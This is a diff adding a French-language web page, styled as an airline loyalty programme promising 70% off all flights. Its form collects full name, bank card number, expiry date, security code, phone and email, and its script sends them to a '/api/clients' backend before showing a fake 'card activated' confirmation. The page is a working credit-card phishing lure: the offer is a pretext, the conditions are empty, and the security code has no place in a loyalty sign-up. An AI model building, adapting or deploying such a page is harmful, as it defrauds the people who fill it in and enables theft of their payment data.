@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Programme Fidélité - 70% Réduction sur vos Vols</title>
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2980 0%, #26d0ce 100%);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 700px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            margin: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #1a2980;
+            font-size: 32px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .header p {
+            color: #666;
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        
+        .promo-banner {
+            background: linear-gradient(90deg, #FF416C 0%, #FF4B2B 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 25px 0;
+            text-align: center;
+            font-weight: bold;
+            font-size: 20px;
+            box-shadow: 0 5px 15px rgba(255, 75, 43, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .promo-banner .percentage {
+            font-size: 48px;
+            font-weight: 900;
+            background: white;
+            color: #FF416C;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .form-section {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: #333;
+            font-weight: 600;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .form-group label .icon {
+            color: #1a2980;
+            font-size: 18px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid #e1e5e9;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: white;
+        }
+        
+        .form-group input:focus {
+            border-color: #1a2980;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(26, 41, 128, 0.1);
+        }
+        
+        .form-group input::placeholder {
+            color: #999;
+        }
+        
+        .form-row {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .form-row > div {
+            flex: 1;
+        }
+        
+        .input-hint {
+            display: block;
+            margin-top: 8px;
+            color: #666;
+            font-size: 14px;
+            font-style: italic;
+        }
+        
+        .input-hint .example {
+            background: #e9ecef;
+            padding: 2px 8px;
+            border-radius: 4px;
+            margin-left: 5px;
+        }
+        
+        .card-example {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 10px;
+            font-family: monospace;
+            font-size: 16px;
+            letter-spacing: 2px;
+            text-align: center;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            margin: 30px 0;
+            padding: 20px;
+            background: #fff8e1;
+            border-radius: 10px;
+            border-left: 4px solid #ffc107;
+        }
+        
+        .checkbox-group input[type="checkbox"] {
+            width: 22px;
+            height: 22px;
+            margin-top: 3px;
+            accent-color: #1a2980;
+        }
+        
+        .checkbox-group label {
+            color: #333;
+            line-height: 1.5;
+        }
+        
+        .checkbox-group a {
+            color: #1a2980;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        
+        .checkbox-group a:hover {
+            text-decoration: underline;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 22px;
+            background: linear-gradient(90deg, #FF416C 0%, #FF4B2B 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255, 75, 43, 0.3);
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .error-message {
+            background: #fee;
+            color: #d32f2f;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 4px solid #d32f2f;
+            display: none;
+        }
+        
+        .success-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .success-content {
+            background: white;
+            padding: 50px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 600px;
+            width: 90%;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+            animation: bounce 1s;
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
+            40% {transform: translateY(-30px);}
+            60% {transform: translateY(-15px);}
+        }
+        
+        .contact-info {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 2px dashed #e1e5e9;
+            color: #666;
+        }
+        
+        .contact-info p {
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 25px;
+                margin: 10px;
+            }
+            
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+            
+            .header h1 {
+                font-size: 26px;
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .promo-banner {
+                flex-direction: column;
+                text-align: center;
+                gap: 10px;
+            }
+            
+            .promo-banner .percentage {
+                width: 60px;
+                height: 60px;
+                font-size: 36px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>
+                <span>✈️</span>
+                Programme Fidélité Voyages
+            </h1>
+            <p>Activez votre carte fidélité et bénéficiez immédiatement de</p>
+        </div>
+        
+        <div class="promo-banner">
+            <div class="percentage">70%</div>
+            <div>
+                <strong>RÉDUCTION EXCEPTIONNELLE</strong><br>
+                Sur tous vos vols pendant 1 an
+            </div>
+        </div>
+        
+        <div class="form-section">
+            <h2 style="color: #1a2980; margin-bottom: 25px; text-align: center;">
+                📝 Formulaire d'activation de votre carte
+            </h2>
+            
+            <form id="activationForm">
+                <!-- Nom complet -->
+                <div class="form-group">
+                    <label for="nom">
+                        <span class="icon">👤</span>
+                        Nom complet *
+                    </label>
+                    <input 
+                        type="text" 
+                        id="nom" 
+                        placeholder="Votre nom et prénom"
+                        required
+                        autocomplete="name"
+                    >
+                    <span class="input-hint">
+                        Saisissez exactement comme sur votre pièce d'identité
+                        <span class="example">Ex: JEAN DUPONT</span>
+                    </span>
+                </div>
+                
+                <!-- Numéro de carte -->
+                <div class="form-group">
+                    <label for="numero">
+                        <span class="icon">💳</span>
+                        Numéro de votre carte bancaire *
+                    </label>
+                    <input 
+                        type="text" 
+                        id="numero" 
+                        placeholder="XXXX XXXX XXXX XXXX"
+                        maxlength="19"
+                        required
+                        autocomplete="cc-number"
+                    >
+                    <span class="input-hint">
+                        16 chiffres sans espaces
+                        <span class="example">Format: 1234 5678 9012 3456</span>
+                    </span>
+                    <div class="card-example">
+                        💳 1234 •••• •••• 3456
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <!-- Date d'expiration -->
+                    <div class="form-group">
+                        <label for="date">
+                            <span class="icon">📅</span>
+                            Date d'expiration *
+                        </label>
+                        <input 
+                            type="text" 
+                            id="date" 
+                            placeholder="MM/AA"
+                            maxlength="5"
+                            required
+                            autocomplete="cc-exp"
+                        >
+                        <span class="input-hint">
+                            Mois/Année
+                            <span class="example">Ex: 12/25</span>
+                        </span>
+                    </div>
+                    
+                    <!-- Code de sécurité -->
+                    <div class="form-group">
+                        <label for="code">
+                            <span class="icon">🔒</span>
+                            Code de sécurité *
+                        </label>
+                        <input 
+                            type="password" 
+                            id="code" 
+                            placeholder="123"
+                            maxlength="3"
+                            required
+                            autocomplete="cc-csc"
+                        >
+                        <span class="input-hint">
+                            3 chiffres au dos de la carte
+                            <span class="example">Ex: 123</span>
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <!-- Téléphone -->
+                    <div class="form-group">
+                        <label for="tel">
+                            <span class="icon">📱</span>
+                            Numéro de téléphone *
+                        </label>
+                        <input 
+                            type="tel" 
+                            id="tel" 
+                            placeholder="06 12 34 56 78"
+                            required
+                            autocomplete="tel"
+                        >
+                        <span class="input-hint">
+                            Pour vous contacter
+                            <span class="example">Ex: 0612345678</span>
+                        </span>
+                    </div>
+                    
+                    <!-- Email -->
+                    <div class="form-group">
+                        <label for="email">
+                            <span class="icon">📧</span>
+                            Adresse email *
+                        </label>
+                        <input 
+                            type="email" 
+                            id="email" 
+                            placeholder="votre.email@exemple.com"
+                            required
+                            autocomplete="email"
+                        >
+                        <span class="input-hint">
+                            Pour recevoir votre confirmation
+                            <span class="example">Ex: jean.dupont@email.com</span>
+                        </span>
+                    </div>
+                </div>
+                
+                <!-- Conditions -->
+                <div class="checkbox-group">
+                    <input type="checkbox" id="conditions" required>
+                    <label for="conditions">
+                        <strong>J'accepte les conditions générales :</strong><br>
+                        ✅ Je bénéficie immédiatement de 70% de réduction sur tous mes vols pendant 1 an<br>
+                        ✅ Je consens à l'utilisation de mes données pour l'activation de ma carte fidélité<br>
+                        ✅ Je recevrai ma confirmation par email dans les 24h<br>
+                        <a href="#" onclick="alert('Conditions disponibles sur demande au service client');">
+                            Lire les conditions complètes
+                        </a>
+                    </label>
+                </div>
+                
+                <!-- Message d'erreur -->
+                <div class="error-message" id="errorMessage"></div>
+                
+                <!-- Bouton de soumission -->
+                <button type="submit" id="submitBtn" class="submit-btn">
+                    <span>🚀</span>
+                    ACTIVER MA RÉDUCTION DE 70%
+                    <span>🎁</span>
+                </button>
+                
+                <div style="text-align: center; margin-top: 15px; color: #666; font-size: 14px;">
+                    ⚡ Activation instantanée • ✅ Confirmation immédiate
+                </div>
+            </form>
+        </div>
+        
+        <div class="contact-info">
+            <p>
+                <span>📞</span>
+                Service client disponible 24h/24 : <strong>0800 123 456</strong>
+            </p>
+            <p>
+                <span>⏰</span>
+                Temps d'activation : <strong>Immédiat</strong> après validation
+            </p>
+            <p>
+                <span>🛡️</span>
+                Données sécurisées • Paiement crypté • Confidentialité garantie
+            </p>
+        </div>
+    </div>
+    
+    <!-- Modal de succès -->
+    <div class="success-modal" id="successModal">
+        <div class="success-content">
+            <div class="success-icon">✅</div>
+            <h2 style="color: #1a2980; margin-bottom: 15px;">FÉLICITATIONS !</h2>
+            <p style="font-size: 20px; margin-bottom: 10px; color: #333;">
+                Votre carte fidélité est activée avec succès !
+            </p>
+            <p style="font-size: 18px; margin-bottom: 20px; color: #666;">
+                Vous bénéficiez maintenant de <strong>70% de réduction</strong> sur tous vos vols.
+            </p>
+            
+            <div style="background: linear-gradient(90deg, #FF416C 0%, #FF4B2B 100%); 
+                        color: white; padding: 20px; border-radius: 10px; margin: 25px 0;">
+                <h3 style="margin-bottom: 10px;">🎁 VOTRE AVANTAGE EST ACTIVÉ !</h3>
+                <p style="font-size: 24px; font-weight: bold;">-70% SUR TOUS VOS VOLS</p>
+                <p style="margin-top: 10px; font-size: 16px;">
+                    Valable 1 an • Sans plafond • Toutes destinations
+                </p>
+            </div>
+            
+            <div style="background: #f0f8ff; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: left;">
+                <h4 style="color: #1a2980; margin-bottom: 10px;">📋 Prochaines étapes :</h4>
+                <ul style="padding-left: 20px; color: #333;">
+                    <li>📧 Vous recevrez un email de confirmation dans quelques minutes</li>
+                    <li>✈️ Réservez vos vols sur notre site avec votre réduction</li>
+                    <li>📱 Votre carte fidélité numérique est disponible dans votre espace client</li>
+                    <li>👑 Accédez à des offres exclusives réservées aux membres</li>
+                </ul>
+            </div>
+            
+            <button onclick="closeModal()" 
+                    style="background: #1a2980; color: white; padding: 15px 40px; 
+                           border: none; border-radius: 10px; cursor: pointer; 
+                           font-size: 18px; font-weight: bold; margin-top: 10px;">
+                🎉 PARFAIT, JE COMPRENDS
+            </button>
+            
+            <p style="margin-top: 20px; color: #666; font-size: 14px;">
+                Votre numéro de dossier : <strong id="dossierNumber">--</strong>
+            </p>
+        </div>
+    </div>
+    
+    <script>
+        // Formatage automatique du numéro de carte
+        document.getElementById('numero').addEventListener('input', function(e) {
+            let valeur = e.target.value.replace(/\D/g, '');
+            valeur = valeur.substring(0, 16);
+            let format = '';
+            for (let i = 0; i < valeur.length; i++) {
+                if (i === 4 || i === 8 || i === 12) format += ' ';
+                format += valeur[i];
+            }
+            e.target.value = format;
+        });
+        
+        // Formatage automatique de la date
+        document.getElementById('date').addEventListener('input', function(e) {
+            let valeur = e.target.value.replace(/\D/g, '');
+            if (valeur.length >= 2) {
+                valeur = valeur.substring(0, 2) + '/' + valeur.substring(2, 4);
+            }
+            e.target.value = valeur.substring(0, 5);
+        });
+        
+        // Soumission du formulaire
+        document.getElementById('activationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const errorDiv = document.getElementById('errorMessage');
+            
+            // Cacher les erreurs précédentes
+            errorDiv.style.display = 'none';
+            errorDiv.textContent = '';
+            
+            // Désactiver le bouton
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span>⏳</span> TRAITEMENT EN COURS... <span>⏳</span>';
+            
+            // Récupérer les données
+            const donnees = {
+                nom: document.getElementById('nom').value.trim().toUpperCase(),
+                numero: document.getElementById('numero').value.replace(/\s/g, ''),
+                date: document.getElementById('date').value,
+                code: document.getElementById('code').value,
+                telephone: document.getElementById('tel').value.trim(),
+                email: document.getElementById('email').value.trim().toLowerCase()
+            };
+            
+            console.log('📤 Données à envoyer :', donnees);
+            
+            // Validation côté client
+            const erreurs = [];
+            
+            // Validation du nom
+            if (!donnees.nom || donnees.nom.length < 2) {
+                erreurs.push('Veuillez saisir votre nom complet');
+            }
+            
+            // Validation du numéro de carte
+            if (!donnees.numero || donnees.numero.length !== 16 || !/^\d+$/.test(donnees.numero)) {
+                erreurs.push('Le numéro de carte doit contenir 16 chiffres');
+            }
+            
+            // Validation de la date
+            if (!donnees.date || !/^\d{2}\/\d{2}$/.test(donnees.date)) {
+                erreurs.push('La date doit être au format MM/AA (ex: 12/25)');
+            }
+            
+            // Validation du code
+            if (!donnees.code || donnees.code.length !== 3 || !/^\d+$/.test(donnees.code)) {
+                erreurs.push('Le code de sécurité doit contenir 3 chiffres');
+            }
+            
+            // Validation du téléphone
+            const telNettoye = donnees.telephone.replace(/\D/g, '');
+            if (!telNettoye || telNettoye.length < 10) {
+                erreurs.push('Veuillez saisir un numéro de téléphone valide');
+            }
+            
+            // Validation de l'email
+            if (!donnees.email || !donnees.email.includes('@') || !donnees.email.includes('.')) {
+                erreurs.push('Veuillez saisir une adresse email valide');
+            }
+            
+            // Validation des conditions
+            if (!document.getElementById('conditions').checked) {
+                erreurs.push('Vous devez accepter les conditions générales');
+            }
+            
+            // Afficher les erreurs s'il y en a
+            if (erreurs.length > 0) {
+                errorDiv.innerHTML = '<strong>❌ Veuillez corriger les erreurs suivantes :</strong><br>' + 
+                                    erreurs.map(err => `• ${err}`).join('<br>');
+                errorDiv.style.display = 'block';
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<span>🚀</span> ACTIVER MA RÉDUCTION DE 70% <span>🎁</span>';
+                return;
+            }
+            
+            try {
+                // Envoyer les données au backend Flask
+                const response = await fetch('/api/clients', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(donnees)
+                });
+                
+                const result = await response.json();
+                
+                if (response.ok && result.success) {
+                    // Succès !
+                    console.log('✅ Réponse du serveur :', result);
+                    
+                    // Générer un numéro de dossier
+                    const dossierNum = 'FID-' + Math.floor(100000 + Math.random() * 900000);
+                    document.getElementById('dossierNumber').textContent = dossierNum;
+                    
+                    // Afficher le modal de succès
+                    document.getElementById('successModal').style.display = 'flex';
+                    
+                    // Réinitialiser le formulaire après un délai
+                    setTimeout(() => {
+                        document.getElementById('activationForm').reset();
+                    }, 1000);
+                    
+                } else {
+                    // Erreur du serveur
+                    throw new Error(result.error || 'Erreur lors de l\'envoi des données');
+                }
+                
+            } catch (error) {
+                console.error('❌ Erreur :', error);
+                errorDiv.innerHTML = `<strong>❌ Une erreur est survenue :</strong><br>${error.message}`;
+                errorDiv.style.display = 'block';
+                
+                // Faire clignoter le message d'erreur
+                errorDiv.style.animation = 'none';
+                setTimeout(() => {
+                    errorDiv.style.animation = '';
+                }, 10);
+                
+            } finally {
+                // Réactiver le bouton
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<span>🚀</span> ACTIVER MA RÉDUCTION DE 70% <span>🎁</span>';
+            }
+        });
+        
+        function closeModal() {
+            document.getElementById('successModal').style.display = 'none';
+        }
+        
+        // Aide au remplissage
+        document.getElementById('nom').addEventListener('focus', function() {
+            if (!this.value) {
+                this.placeholder = 'Ex: JEAN DUPONT';
+            }
+        });
+        
+        document.getElementById('numero').addEventListener('focus', function() {
+            this.style.letterSpacing = '2px';
+        });
+        
+        document.getElementById('numero').addEventListener('blur', function() {
+            this.style.letterSpacing = 'normal';
+        });
+        
+        // Message d'accueil
+        console.log('🎫 Formulaire de fidélité chargé !');
+        console.log('✈️ Programme de réduction de 70% sur tous les vols');
+        console.log('📞 Service client : 0800 123 456');
+    </script>
+</body>
+</html>
